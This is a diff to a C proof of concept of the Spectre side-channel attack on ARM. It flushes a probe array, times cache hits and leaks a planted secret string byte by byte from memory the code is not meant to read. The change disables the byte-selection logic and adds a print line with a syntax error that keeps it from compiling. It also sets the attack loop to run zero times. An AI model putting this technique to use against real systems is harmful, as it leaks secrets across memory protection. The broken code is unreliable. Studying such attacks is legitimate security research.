@@ -12,7 +12,7 @@ u_int8_t buffer[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
 // unsigned int buffer_size = 4;
 // u_int8_t buffer[8] = {0,1,2,3};
 u_int8_t array[256*4096];
-char*secret = "This is a secret string";
+char*secret = "AThis is a secret string";
 u_int8_t temp = 0;
 
 static inline void flush(void *address) {
@@ -87,15 +87,16 @@ void spectre(size_t offset){
 	    }
 	  }
 	}
-	int max_value = 0;
-	int max_char = 0;
+	//int max_value = 0;
+	//int max_char = 0;
 	for(i = buffer_size; i<256; i++){
-		if(results[i] > max_value){
+		/*if(results[i] > max_value){
 			max_value = results[i];
 			max_char = i;
-		}
+		}*/
+		printf("%d, "results[i])
 	}
-	printf("Max. character = (%c, %d) \n", max_char, max_value);
+	//printf("Max. character = (%c, %d) \n", max_char, max_value);
 }
 
 int main(int argc, const char**argv){
@@ -110,7 +111,7 @@ int main(int argc, const char**argv){
   asm volatile ("DSB SY");
 
   size_t secret_offset = (size_t)(secret - (char*)buffer);
-	for(int i=0; i<23; i++){ // length of secret is known
+	for(int i=0; i<0; i++){ // length of secret is known
   	spectre(secret_offset+i);
 	}
   return 0;
